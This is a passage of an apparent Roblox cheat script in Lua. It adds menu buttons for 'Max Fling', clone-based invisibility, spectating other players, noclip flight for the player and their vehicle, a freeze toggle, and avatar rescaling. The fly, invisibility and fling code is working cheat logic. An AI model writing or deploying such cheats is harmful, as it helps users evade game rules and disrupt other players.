            -- Instantly restore so we don't break our own screen or fall into the void
            if root then
                root.Velocity = savedVel
                root.RotVelocity = savedRot
            end
        end)
    else
        FlingBtn.Text = "🌪️ Max Fling: OFF"
        FlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        if systemFlingLoop then
            systemFlingLoop:Disconnect()
            systemFlingLoop = nil
        end
        if root then
            root.Velocity = Vector3.zero
            root.RotVelocity = Vector3.zero
        end
        
        -- Restore original avatar mass
        for part, props in pairs(originalProperties) do
            if part and part.Parent then
                part.CustomPhysicalProperties = props
            end
        end
        table.clear(originalProperties)
    end
end)
-- ========== INVISIBLE+ (AmokahFox Clone Method) ==========
local isVisPlusOn = false
local invisRunning = false
local invisFix = nil
local invisDied = nil
local RealCharacter = nil
local FakeCharacter = nil

local VisPlusBtn = Instance.new("TextButton")
VisPlusBtn.Size = UDim2.new(1, -5, 0, 40)
VisPlusBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
VisPlusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
VisPlusBtn.Font = Enum.Font.SourceSansBold
VisPlusBtn.TextSize = 16
VisPlusBtn.Text = "👻 Invisible+: OFF"
VisPlusBtn.BorderSizePixel = 0
VisPlusBtn.Parent = ToolsScroll

local function TurnVisible()
    if not invisRunning then return end
    
    if invisFix then invisFix:Disconnect() end
    if invisDied then invisDied:Disconnect() end
    
    local Player = game.Players.LocalPlayer
    if RealCharacter and RealCharacter.Parent == game.Lighting then
        local CF_1 = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart.CFrame
        
        FakeCharacter:Destroy()
        Player.Character = RealCharacter
        RealCharacter.Parent = workspace
        
        if CF_1 and RealCharacter:FindFirstChild("HumanoidRootPart") then
            RealCharacter.HumanoidRootPart.CFrame = CF_1
        end
        
        local anim = RealCharacter:FindFirstChild("Animate")
        if anim then
            anim.Disabled = true
            anim.Disabled = false
        end
    end
    invisRunning = false
    isVisPlusOn = false
    VisPlusBtn.Text = "👻 Invisible+: OFF"
    VisPlusBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
end

local function Respawn()
    if not invisRunning then return end
    local Player = game.Players.LocalPlayer
    pcall(function()
        Player.Character = RealCharacter
        task.wait()
        RealCharacter.Parent = workspace
        local hum = RealCharacter:FindFirstChildWhichIsA('Humanoid')
        if hum then hum:Destroy() end
        TurnVisible()
    end)
end

local function TurnInvisiblePlus()
    if invisRunning then return end
    invisRunning = true
    isVisPlusOn = true
    VisPlusBtn.Text = "👻 Invisible+: ON"
    VisPlusBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)

    local Player = game.Players.LocalPlayer
    RealCharacter = Player.Character
    if not RealCharacter then return TurnVisible() end
    
    RealCharacter.Archivable = true
    FakeCharacter = RealCharacter:Clone()
    FakeCharacter.Parent = game.Lighting
    FakeCharacter.Name = ""
    
    local Void = workspace.FallenPartsDestroyHeight

    invisFix = game:GetService("RunService").Stepped:Connect(function()
        pcall(function()
            local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if root then
                if root.Position.Y <= Void then
                    Respawn()
                end
            end
        end)
    end)

    for _, v in ipairs(FakeCharacter:GetDescendants()) do
        if v:IsA("BasePart") then
            if v.Name == "HumanoidRootPart" then
                v.Transparency = 1
            else
                v.Transparency = 0.5
            end
        end
    end

    local fakeHum = FakeCharacter:FindFirstChildOfClass('Humanoid')
    if fakeHum then
        invisDied = fakeHum.Died:Connect(function()
            Respawn()
        end)
    end

    local CF_1 = RealCharacter:FindFirstChild("HumanoidRootPart") and RealCharacter.HumanoidRootPart.CFrame
    RealCharacter:MoveTo(Vector3.new(0, math.pi * 1000000, 0))
    
    workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
    task.wait(0.2)
    workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
    
    RealCharacter.Parent = game.Lighting
    FakeCharacter.Parent = workspace
    if CF_1 and FakeCharacter:FindFirstChild("HumanoidRootPart") then
        FakeCharacter.HumanoidRootPart.CFrame = CF_1
    end
    Player.Character = FakeCharacter
    
    workspace.CurrentCamera.CameraSubject = FakeCharacter:FindFirstChildWhichIsA('Humanoid')
    
    local anim = FakeCharacter:FindFirstChild("Animate")
    if anim then
        anim.Disabled = true
        anim.Disabled = false
    end
end

VisPlusBtn.MouseButton1Click:Connect(function()
    if isVisPlusOn then
        TurnVisible()
    else
        TurnInvisiblePlus()
    end
end)
-- ========== PURE ANTI-SPIN SPECTATE LOGIC ==========
local isViewing = false
local viewLoop = nil
local viewPart = nil
local selectedSpectateTarget = nil

local function stopView()
    isViewing = false
    selectedSpectateTarget = nil
    if viewLoop then viewLoop:Disconnect() viewLoop = nil end
    if viewPart then viewPart:Destroy() viewPart = nil end
    
    local cam = workspace.CurrentCamera
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if cam and hum then
        cam.CameraSubject = hum
    end
end

local function startView(targetPlayer)
    stopView()
    if not targetPlayer or not targetPlayer.Character then return end
    isViewing = true
    selectedSpectateTarget = targetPlayer
    
    viewPart = Instance.new("Part")
    viewPart.Transparency = 1
    viewPart.CanCollide = false
    viewPart.Anchored = true
    viewPart.Parent = workspace
    
    workspace.CurrentCamera.CameraSubject = viewPart
    
    viewLoop = RunService.RenderStepped:Connect(function()
        if not selectedSpectateTarget or not selectedSpectateTarget.Character then return end
        local tRoot = selectedSpectateTarget.Character:FindFirstChild("HumanoidRootPart")
        if tRoot then
            viewPart.CFrame = CFrame.new(tRoot.Position)
        end
    end)
end

-- ==============================================================
-- ✈️ SMART FLY TOOL (Local + RC Drone Vehicle Fly)
-- ==============================================================
local localFlyEnabled = false
local vehFlyEnabled = false
local vehViewEnabled = false
local plrFrozen = false
local localFlySpeed = 2 -- SHARED SPEED VARIABLE

-- Physics Trackers
local flyLoop = nil
local vFlyLoop = nil
local flyKeys = {f=0, b=0, l=0, r=0, q=0, e=0}
local flyInputs = {}
local vFlyCollisions = {}

-- 1. Main Container
local FlyContainer = Instance.new("Frame")
FlyContainer.Size = UDim2.new(1, -5, 0, 40)
FlyContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
FlyContainer.BorderSizePixel = 0
FlyContainer.ClipsDescendants = true
FlyContainer.Parent = ToolsScroll

-- 2. The Main Button (Local Fly)
local FlyBtn = Instance.new("TextButton")
FlyBtn.Size = UDim2.new(1, 0, 0, 40)
FlyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
FlyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FlyBtn.Font = Enum.Font.SourceSansBold
FlyBtn.TextSize = 16
FlyBtn.Text = "✈️ Local Fly: OFF (Hold for Options)"
FlyBtn.BorderSizePixel = 0
FlyBtn.Parent = FlyContainer
Instance.new("UICorner", FlyBtn).CornerRadius = UDim.new(0, 8)

-- 3. The Shared Speed Slider
local SpeedSlider = createSlider(FlyContainer, "⚡ Shared Fly Speed", 1, 10, 2, function(value)
    localFlySpeed = value
end)
SpeedSlider.Position = UDim2.new(0, 0, 0, 45)

-- 4. The Vehicle Fly Button
local VehFlyBtn = Instance.new("TextButton")
VehFlyBtn.Size = UDim2.new(1, -10, 0, 35)
VehFlyBtn.Position = UDim2.new(0, 5, 0, 100)
VehFlyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
VehFlyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
VehFlyBtn.Font = Enum.Font.SourceSansBold
VehFlyBtn.TextSize = 15
VehFlyBtn.Text = "🚗 Vehicle Fly: OFF"
VehFlyBtn.BorderSizePixel = 0
VehFlyBtn.Parent = FlyContainer
Instance.new("UICorner", VehFlyBtn).CornerRadius = UDim.new(0, 6)

-- 5. Vehicle View Button (Camera Snap)
local VehViewBtn = Instance.new("TextButton")
VehViewBtn.Size = UDim2.new(1, -10, 0, 35)
VehViewBtn.Position = UDim2.new(0, 5, 0, 140)
VehViewBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
VehViewBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
VehViewBtn.Font = Enum.Font.SourceSansBold
VehViewBtn.TextSize = 15
VehViewBtn.Text = "🎥 Vehicle View: OFF"
VehViewBtn.BorderSizePixel = 0
VehViewBtn.Parent = FlyContainer
Instance.new("UICorner", VehViewBtn).CornerRadius = UDim.new(0, 6)

-- 6. Stone Player Button (Freeze Body)
local FreezeBtn = Instance.new("TextButton")
FreezeBtn.Size = UDim2.new(1, -10, 0, 35)
FreezeBtn.Position = UDim2.new(0, 5, 0, 180)
FreezeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
FreezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FreezeBtn.Font = Enum.Font.SourceSansBold
FreezeBtn.TextSize = 15
FreezeBtn.Text = "🗿 Stone Player: OFF"
FreezeBtn.BorderSizePixel = 0
FreezeBtn.Parent = FlyContainer
Instance.new("UICorner", FreezeBtn).CornerRadius = UDim.new(0, 6)

-- ==========================================
-- UTILITY & CAMERA LOGIC
-- ==========================================
local function getMyVehicle()
    local vehiclesFolder = workspace:FindFirstChild("Vehicles")
    if not vehiclesFolder then return nil end
    for _, v in pairs(vehiclesFolder:GetChildren()) do
        local ownerObj = v:FindFirstChild("owner") or v:FindFirstChild("owner", true)
        if ownerObj and ownerObj.Value == LocalPlayer then return v end
    end
    return nil
end

local function resetDroneTools()
    -- Reset Camera
    if vehViewEnabled then
        vehViewEnabled = false
        VehViewBtn.Text = "🎥 Vehicle View: OFF"
        VehViewBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then workspace.CurrentCamera.CameraSubject = hum end
    end
    -- Reset Player Freeze
    if plrFrozen then
        plrFrozen = false
        FreezeBtn.Text = "🗿 Stone Player: OFF"
        FreezeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Anchored = false end
    end
end

VehViewBtn.MouseButton1Click:Connect(function()
    vehViewEnabled = not vehViewEnabled
    local cam = workspace.CurrentCamera
    if vehViewEnabled then
        local car = getMyVehicle()
        local targetPart = car and (car.PrimaryPart or car:FindFirstChild("Base"))
        if targetPart then
            VehViewBtn.Text = "🎥 Vehicle View: ON"
            VehViewBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
            cam.CameraSubject = targetPart
        else
            vehViewEnabled = false
            VehViewBtn.Text = "No Car Found!"
            task.wait(1.5)
            VehViewBtn.Text = "🎥 Vehicle View: OFF"
        end
    else
        VehViewBtn.Text = "🎥 Vehicle View: OFF"
        VehViewBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then cam.CameraSubject = hum end
    end
end)

FreezeBtn.MouseButton1Click:Connect(function()
    plrFrozen = not plrFrozen
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if plrFrozen then
        FreezeBtn.Text = "🗿 Stone Player: ON"
        FreezeBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        if hrp then hrp.Anchored = true end
    else
        FreezeBtn.Text = "🗿 Stone Player: OFF"
        FreezeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        if hrp then hrp.Anchored = false end
    end
end)

-- ==========================================
-- LOCAL FLY PHYSICS
-- ==========================================
local function stopLocalFly()
    localFlyEnabled = false
    FlyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    
    if FlyContainer.Size.Y.Offset > 50 then
        FlyBtn.Text = "✈️ Local Fly: OFF [▲ Options]"
    else
        FlyBtn.Text = "✈️ Local Fly: OFF (Hold for Options)"
    end

    if flyLoop then flyLoop:Disconnect() flyLoop = nil end
    for _, c in pairs(flyInputs) do c:Disconnect() end
    table.clear(flyInputs)
    flyKeys = {f=0, b=0, l=0, r=0, q=0, e=0}

    local char = LocalPlayer.Character
    if char then
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hrp then
            local bg = hrp:FindFirstChild("LocalFlyGyro")
            local bv = hrp:FindFirstChild("LocalFlyVelocity")
            if bg then bg:Destroy() end
            if bv then bv:Destroy() end
        end
        if hum then 
            hum.PlatformStand = false 
            hum:ChangeState(Enum.HumanoidStateType.Jumping) 
        end
    end
end

local function startLocalFly()
    if vehFlyEnabled then stopVehFly() end 
    
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then stopLocalFly() return end

    local bg = Instance.new("BodyGyro", hrp)
    bg.Name = "LocalFlyGyro"
    bg.P = 9e4
    bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    bg.CFrame = hrp.CFrame

    local bv = Instance.new("BodyVelocity", hrp)
    bv.Name = "LocalFlyVelocity"
    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    bv.Velocity = Vector3.zero

    hum.PlatformStand = true

    flyLoop = RunService.RenderStepped:Connect(function()
        if not char or not char.Parent then stopLocalFly() return end
        local cam = workspace.CurrentCamera
        bg.CFrame = cam.CFrame
        
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
            local success, controlModule = pcall(function() return require(LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule")) end)
            if success and controlModule then
                local dir = controlModule:GetMoveVector()
                if dir.Magnitude > 0 then
                    bv.Velocity = (cam.CFrame.LookVector * -dir.Z + cam.CFrame.RightVector * dir.X) * (localFlySpeed * 50)
                else
                    bv.Velocity = Vector3.zero
                end
            end
        else
            local look = cam.CFrame.LookVector
            local right = cam.CFrame.RightVector
            local up = Vector3.new(0, 1, 0)
            local vel = (look * (flyKeys.f + flyKeys.b)) + (right * (flyKeys.r + flyKeys.l)) + (up * (flyKeys.q + flyKeys.e))
            if vel.Magnitude > 0 then
                bv.Velocity = vel.Unit * (localFlySpeed * 50)
            else
                bv.Velocity = bv.Velocity * 0.9 
            end
        end
    end)

    table.insert(flyInputs, UserInputService.InputBegan:Connect(function(i, gp)
        if gp then return end
        if i.KeyCode == Enum.KeyCode.W then flyKeys.f = 1 end
        if i.KeyCode == Enum.KeyCode.S then flyKeys.b = -1 end
        if i.KeyCode == Enum.KeyCode.A then flyKeys.l = -1 end
        if i.KeyCode == Enum.KeyCode.D then flyKeys.r = 1 end
        if i.KeyCode == Enum.KeyCode.E or i.KeyCode == Enum.KeyCode.Space then flyKeys.q = 1 end
        if i.KeyCode == Enum.KeyCode.Q or i.KeyCode == Enum.KeyCode.LeftShift then flyKeys.e = -1 end
    end))
    table.insert(flyInputs, UserInputService.InputEnded:Connect(function(i)
        if i.KeyCode == Enum.KeyCode.W then flyKeys.f = 0 end
        if i.KeyCode == Enum.KeyCode.S then flyKeys.b = 0 end
        if i.KeyCode == Enum.KeyCode.A then flyKeys.l = 0 end
        if i.KeyCode == Enum.KeyCode.D then flyKeys.r = 0 end
        if i.KeyCode == Enum.KeyCode.E or i.KeyCode == Enum.KeyCode.Space then flyKeys.q = 0 end
        if i.KeyCode == Enum.KeyCode.Q or i.KeyCode == Enum.KeyCode.LeftShift then flyKeys.e = 0 end
    end))
end

-- ==========================================
-- VEHICLE FLY PHYSICS (RC DRONE)
-- ==========================================
local function stopVehFly()
    vehFlyEnabled = false
    VehFlyBtn.Text = "🚗 Vehicle Fly: OFF"
    VehFlyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)

    if vFlyLoop then vFlyLoop:Disconnect() vFlyLoop = nil end
    for _, c in pairs(flyInputs) do c:Disconnect() end
    table.clear(flyInputs)
    flyKeys = {f=0, b=0, l=0, r=0, q=0, e=0}

    resetDroneTools() -- Shut down camera view and stone player

    -- Restore Collisions
    for part, state in pairs(vFlyCollisions) do
        if part and part.Parent then part.CanCollide = state end
    end
    table.clear(vFlyCollisions)

    local car = getMyVehicle()
    if car then
        local base = car:FindFirstChild("Base") or car.PrimaryPart
        if base then
            local bg = base:FindFirstChild("VehFlyGyro")
            local bv = base:FindFirstChild("VehFlyVelocity")
            if bg then bg:Destroy() end
            if bv then bv:Destroy() end
        end
    end
end

local function startVehFly()
    if localFlyEnabled then stopLocalFly() end 
    
    local car = getMyVehicle()
    if not car then stopVehFly() VehFlyBtn.Text = "No Vehicle Found!" task.wait(1.5) VehFlyBtn.Text = "🚗 Vehicle Fly: OFF" return end
    
    local base = car:FindFirstChild("Base") or car.PrimaryPart
    if not base then stopVehFly() return end

    -- Save & Disable Collisions
    table.clear(vFlyCollisions)
    for _, v in ipairs(car:GetDescendants()) do
        if v:IsA("BasePart") then
            vFlyCollisions[v] = v.CanCollide
            v.CanCollide = false
        end
    end

    local bg = Instance.new("BodyGyro", base)
    bg.Name = "VehFlyGyro"
    bg.P = 3e4
    bg.D = 1e3
    bg.MaxTorque = Vector3.new(0, 9e9, 0)
    bg.CFrame = base.CFrame

    local bv = Instance.new("BodyVelocity", base)
    bv.Name = "VehFlyVelocity"
    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    bv.Velocity = Vector3.zero

    vFlyLoop = RunService.Heartbeat:Connect(function()
        if not car or not base.Parent then stopVehFly() return end
        base.AssemblyAngularVelocity = Vector3.zero
        
        local cam = workspace.CurrentCamera
        local look = cam.CFrame.LookVector
        local yaw = math.atan2(-look.X, -look.Z)
        bg.CFrame = CFrame.new(base.Position) * CFrame.Angles(0, yaw, 0)

        -- Calculate desired velocity
        local targetVelocity = Vector3.zero
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
            local success, controlModule = pcall(function() return require(LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule")) end)
            if success and controlModule then
                local dir = controlModule:GetMoveVector()
                if dir.Magnitude > 0 then
                    targetVelocity = (cam.CFrame.LookVector * -dir.Z + cam.CFrame.RightVector * dir.X) * (localFlySpeed * 50)
                end
            end
        else
            local forwardMag = flyKeys.f + flyKeys.b
            local rightMag = flyKeys.r + flyKeys.l
            local upMag = flyKeys.q + flyKeys.e
            targetVelocity = (cam.CFrame.LookVector * forwardMag + cam.CFrame.RightVector * rightMag + Vector3.new(0, upMag, 0)) * (localFlySpeed * 50)
        end
        
        -- ⭐ ANTI-STUCK BOUNDARY LIMITER (400 Studs)
        local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if myRoot then
            local distFromPlayer = (base.Position - myRoot.Position).Magnitude
            if distFromPlayer > 400 then
                -- Find the direction vector pointing FROM the player TO the car
                local vectorAwayFromPlayer = (base.Position - myRoot.Position).Unit
                -- Check if the car's intended velocity is pushing it further outward
                local outwardForce = targetVelocity:Dot(vectorAwayFromPlayer)
                
                if outwardForce > 0 then
                    -- Cancel out only the speed pushing it away, allow it to fly sideways or back towards you
                    targetVelocity = targetVelocity - (vectorAwayFromPlayer * outwardForce)
                end
            end
        end

        bv.Velocity = targetVelocity
    end)

    table.insert(flyInputs, UserInputService.InputBegan:Connect(function(i, gp)
        if gp then return end
        if i.KeyCode == Enum.KeyCode.W then flyKeys.f = 1 end
        if i.KeyCode == Enum.KeyCode.S then flyKeys.b = -1 end
        if i.KeyCode == Enum.KeyCode.A then flyKeys.l = -1 end
        if i.KeyCode == Enum.KeyCode.D then flyKeys.r = 1 end
        if i.KeyCode == Enum.KeyCode.E or i.KeyCode == Enum.KeyCode.Space then flyKeys.q = 1 end
        if i.KeyCode == Enum.KeyCode.Q or i.KeyCode == Enum.KeyCode.LeftShift then flyKeys.e = -1 end
    end))
    table.insert(flyInputs, UserInputService.InputEnded:Connect(function(i)
        if i.KeyCode == Enum.KeyCode.W then flyKeys.f = 0 end
        if i.KeyCode == Enum.KeyCode.S then flyKeys.b = 0 end
        if i.KeyCode == Enum.KeyCode.A then flyKeys.l = 0 end
        if i.KeyCode == Enum.KeyCode.D then flyKeys.r = 0 end
        if i.KeyCode == Enum.KeyCode.E or i.KeyCode == Enum.KeyCode.Space then flyKeys.q = 0 end
        if i.KeyCode == Enum.KeyCode.Q or i.KeyCode == Enum.KeyCode.LeftShift then flyKeys.e = 0 end
    end))
end

VehFlyBtn.MouseButton1Click:Connect(function()
    vehFlyEnabled = not vehFlyEnabled
    if vehFlyEnabled then
        VehFlyBtn.Text = "🚗 Vehicle Fly: ON"
        VehFlyBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        startVehFly()
    else
        stopVehFly()
    end
end)

-- ==========================================
-- SMART HOLD LOGIC CONNECTION
-- ==========================================
applySmartHold(
    FlyBtn,        -- The button to click/hold
    FlyContainer,  -- The frame to expand/shrink
    40,            -- Normal collapsed height
    225,           -- Expanded height (to fit 4 buttons + 1 slider)
    0.5,           -- Hold duration
    
    function()
        localFlyEnabled = not localFlyEnabled
        if localFlyEnabled then
            FlyBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
            startLocalFly()
        else
            FlyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
            stopLocalFly()
        end
    end,
    
    function(isExpanded)
        if isExpanded then
            FlyBtn.Text = localFlyEnabled and "✈️ Local Fly: ON [▲ Options]" or "✈️ Local Fly: OFF [▲ Options]"
        else
            FlyBtn.Text = localFlyEnabled and "✈️ Local Fly: ON (Hold for Options)" or "✈️ Local Fly: OFF (Hold for Options)"
        end
    end
)
-- ========== AVATAR SCALER TOOL (Collapsible) ==========
local ScalerFrame = Instance.new("Frame")
ScalerFrame.Size = UDim2.new(1, -5, 0, 30) -- Starts collapsed
ScalerFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
ScalerFrame.BorderSizePixel = 0
ScalerFrame.ClipsDescendants = true
ScalerFrame.Parent = ToolsScroll

-- The Clickable Title / Dropdown Button
local ScalerToggleBtn = Instance.new("TextButton")
ScalerToggleBtn.Size = UDim2.new(1, 0, 0, 30)
ScalerToggleBtn.Position = UDim2.new(0, 0, 0, 0)
ScalerToggleBtn.Text = "  📏 Custom Avatar Scaler [ ▼ ]"
ScalerToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 200)
ScalerToggleBtn.Font = Enum.Font.SourceSansBold
ScalerToggleBtn.TextSize = 14
ScalerToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
ScalerToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
ScalerToggleBtn.BorderSizePixel = 0
ScalerToggleBtn.Parent = ScalerFrame

-- Container for all the inputs (Hidden by default)
local ScalerContent = Instance.new("Frame")
ScalerContent.Size = UDim2.new(1, 0, 1, -30)
ScalerContent.Position = UDim2.new(0, 0, 0, 30)
ScalerContent.BackgroundTransparency = 1
ScalerContent.Visible = false
ScalerContent.Parent = ScalerFrame

-- 1. Height
local HeightLabel = Instance.new("TextLabel")
HeightLabel.Size = UDim2.new(0, 60, 0, 20)
HeightLabel.Position = UDim2.new(0, 5, 0, 5)
HeightLabel.Text = "Height:"
HeightLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
HeightLabel.Font = Enum.Font.SourceSansBold
HeightLabel.TextSize = 13
HeightLabel.BackgroundTransparency = 1
HeightLabel.Parent = ScalerContent

local HeightInput = Instance.new("TextBox")
HeightInput.Size = UDim2.new(0.3, -20, 0, 20)
HeightInput.Position = UDim2.new(0, 65, 0, 5)
HeightInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
HeightInput.TextColor3 = Color3.fromRGB(255, 255, 255)
HeightInput.Font = Enum.Font.Code
HeightInput.TextSize = 13
HeightInput.Text = "1"
HeightInput.Parent = ScalerContent

-- 2. Width
local WidthLabel = Instance.new("TextLabel")
WidthLabel.Size = UDim2.new(0, 60, 0, 20)
WidthLabel.Position = UDim2.new(0, 5, 0, 30)
WidthLabel.Text = "Width:"
WidthLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
WidthLabel.Font = Enum.Font.SourceSansBold
WidthLabel.TextSize = 13
WidthLabel.BackgroundTransparency = 1
WidthLabel.Parent = ScalerContent

local WidthInput = Instance.new("TextBox")
WidthInput.Size = UDim2.new(0.3, -20, 0, 20)
WidthInput.Position = UDim2.new(0, 65, 0, 30)
WidthInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
WidthInput.TextColor3 = Color3.fromRGB(255, 255, 255)
WidthInput.Font = Enum.Font.Code
WidthInput.TextSize = 13
WidthInput.Text = "1"
WidthInput.Parent = ScalerContent

-- 3. Depth
local DepthLabel = Instance.new("TextLabel")
DepthLabel.Size = UDim2.new(0, 60, 0, 20)
DepthLabel.Position = UDim2.new(0, 5, 0, 55)
DepthLabel.Text = "Depth:"
DepthLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
DepthLabel.Font = Enum.Font.SourceSansBold
DepthLabel.TextSize = 13
DepthLabel.BackgroundTransparency = 1
DepthLabel.Parent = ScalerContent

local DepthInput = Instance.new("TextBox")
DepthInput.Size = UDim2.new(0.3, -20, 0, 20)
DepthInput.Position = UDim2.new(0, 65, 0, 55)
DepthInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
DepthInput.TextColor3 = Color3.fromRGB(255, 255, 255)
DepthInput.Font = Enum.Font.Code
DepthInput.TextSize = 13
DepthInput.Text = "1"
DepthInput.Parent = ScalerContent

-- 4. Head
local HeadLabel = Instance.new("TextLabel")
HeadLabel.Size = UDim2.new(0, 60, 0, 20)
HeadLabel.Position = UDim2.new(0, 5, 0, 80)
HeadLabel.Text = "Head:"
HeadLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
HeadLabel.Font = Enum.Font.SourceSansBold
HeadLabel.TextSize = 13
HeadLabel.BackgroundTransparency = 1
HeadLabel.Parent = ScalerContent

local HeadInput = Instance.new("TextBox")
HeadInput.Size = UDim2.new(0.3, -20, 0, 20)
HeadInput.Position = UDim2.new(0, 65, 0, 80)
HeadInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
HeadInput.TextColor3 = Color3.fromRGB(255, 255, 255)
HeadInput.Font = Enum.Font.Code
HeadInput.TextSize = 13
HeadInput.Text = "1"
HeadInput.Parent = ScalerContent

-- 5. BodyType
local BodyTypeLabel = Instance.new("TextLabel")
BodyTypeLabel.Size = UDim2.new(0, 60, 0, 20)
BodyTypeLabel.Position = UDim2.new(0, 5, 0, 105)
BodyTypeLabel.Text = "BodyType:"
BodyTypeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
BodyTypeLabel.Font = Enum.Font.SourceSansBold
BodyTypeLabel.TextSize = 13
BodyTypeLabel.BackgroundTransparency = 1
BodyTypeLabel.Parent = ScalerContent

local BodyTypeInput = Instance.new("TextBox")
BodyTypeInput.Size = UDim2.new(0.3, -20, 0, 20)
BodyTypeInput.Position = UDim2.new(0, 65, 0, 105)
BodyTypeInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
BodyTypeInput.TextColor3 = Color3.fromRGB(255, 255, 255)
BodyTypeInput.Font = Enum.Font.Code
BodyTypeInput.TextSize = 13
BodyTypeInput.Text = "0"
BodyTypeInput.Parent = ScalerContent

local ApplyScaleBtn = Instance.new("TextButton")
ApplyScaleBtn.Size = UDim2.new(0.4, 0, 0, 120) 
ApplyScaleBtn.Position = UDim2.new(0.6, -5, 0, 5)
ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
ApplyScaleBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
ApplyScaleBtn.Font = Enum.Font.SourceSansBold
ApplyScaleBtn.TextSize = 14
ApplyScaleBtn.Text = "Apply Sizes"
ApplyScaleBtn.BorderSizePixel = 0
ApplyScaleBtn.Parent = ScalerContent

-- Dropdown Toggle Logic
local scalerExpanded = false
ScalerToggleBtn.MouseButton1Click:Connect(function()
    scalerExpanded = not scalerExpanded
    if scalerExpanded then
        ScalerFrame.Size = UDim2.new(1, -5, 0, 165)
        ScalerContent.Visible = true
        ScalerToggleBtn.Text = "  📏 Custom Avatar Scaler [ ▲ ]"
    else
        ScalerFrame.Size = UDim2.new(1, -5, 0, 30)
        ScalerContent.Visible = false
        ScalerToggleBtn.Text = "  📏 Custom Avatar Scaler [ ▼ ]"
    end
end)

-- Apply Button Logic
ApplyScaleBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    local success, description = pcall(function() return humanoid:GetAppliedDescription() end)
    if not success or not description then return end

    ApplyScaleBtn.Text = "Scanning..."
    
    local outfitData = {}
    local function getVal(prop)
        local ok, val = pcall(function() return description[prop] end)
        return (ok and val ~= nil) and val or nil
    end

    local hc = getVal("HeadColor")
    if typeof(hc) == "Color3" then outfitData.SkinTone = {hc.R, hc.G, hc.B} end

    local props = {"Face", "Shirt", "Pants", "GraphicTShirt", "Head", "Torso", "LeftArm", "RightArm", "LeftLeg", "RightLeg", "IdleAnimation", "WalkAnimation", "RunAnimation", "JumpAnimation", "FallAnimation", "ClimbAnimation", "SwimAnimation", "ProportionScale"}
    for _, p in ipairs(props) do outfitData[p] = getVal(p) end

    outfitData.Accessories = {}
    pcall(function()
        local accs = description:GetAccessories(true)
        if accs then
            for _, a in pairs(accs) do
                table.insert(outfitData.Accessories, {
                    AssetId = a.AssetId,
                    IsLayered = a.IsLayered,
                    AccessoryType = a.AccessoryType and tostring(a.AccessoryType):gsub("Enum.AccessoryType.", "") or a.AccessoryType
                })
            end
        end
    end)

    -- INJECT ALL CUSTOM SIZES
    outfitData.HeightScale = tonumber(HeightInput.Text) or 1
